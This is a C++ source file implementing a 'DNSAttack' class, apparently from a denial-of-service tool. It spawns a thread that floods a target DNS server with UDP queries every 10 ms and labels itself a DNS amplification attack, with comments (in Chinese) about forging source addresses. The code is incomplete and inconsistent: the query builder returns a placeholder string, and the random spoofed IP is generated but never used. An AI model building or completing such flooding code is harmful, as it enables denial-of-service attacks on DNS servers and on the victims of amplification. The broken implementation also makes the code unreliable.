#include "attack/DNSAttack.h"
#include "network/PacketBuilder.h"
#include "network/RawSocket.h"
#include "util/Logger.h"
#include <thread>
#include <chrono>

DNSAttack::DNSAttack(const std::string& targetDNS, const std::string& domain, int queryType)
    : targetDNS_(targetDNS), domain_(domain), queryType_(queryType) {}

DNSAttack::~DNSAttack() {
    stop();
}

void DNSAttack::start() {
    if (running_) return;
    
    running_ = true;
    Logger::getInstance().log(LogLevel::INFO, "Starting DNS attack on " + targetDNS_);
    
    std::thread([this]() {
        try {
            // 使用UDP socket进行DNS攻击
            SocketWrapper socket(AF_INET, SOCK_DGRAM, 0);
            
            // 构建DNS查询包（简化实现）
            std::string dnsQuery = buildDNSQuery(domain_, queryType_);
            
            struct sockaddr_in serverAddr;
            memset(&serverAddr, 0, sizeof(serverAddr));
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_port = htons(53);
            inet_pton(AF_INET, targetDNS_.c_str(), &serverAddr.sin_addr);
            
            while (running_) {
                // 生成随机源IP（伪造源地址）
                std::string sourceIP = Randomizer::getInstance().randomIP();
                
                // 发送DNS查询
                if (sendto(socket.getDescriptor(), dnsQuery.c_str(), dnsQuery.size(), 0,
                          (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
                    Logger::getInstance().log(LogLevel::ERROR, "Failed to send DNS query");
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        } catch (const std::exception& e) {
            Logger::getInstance().log(LogLevel::ERROR, "DNS attack error: " + std::string(e.what()));
            running_ = false;
        }
    }).detach();
}

void DNSAttack::stop() {
    running_ = false;
    Logger::getInstance().log(LogLevel::INFO, "Stopped DNS attack");
}

std::string DNSAttack::getDescription() const {
    return "DNS amplification attack targeting " + targetDNS_ + " with domain " + domain_;
}

std::string DNSAttack::buildDNSQuery(const std::string& domain, int queryType) {
    // 简化实现，实际应用中需要构建完整的DNS查询包
    // 这里返回一个简单的占位符
    return "DNS_QUERY_" + domain + "_" + std::to_string(queryType);
}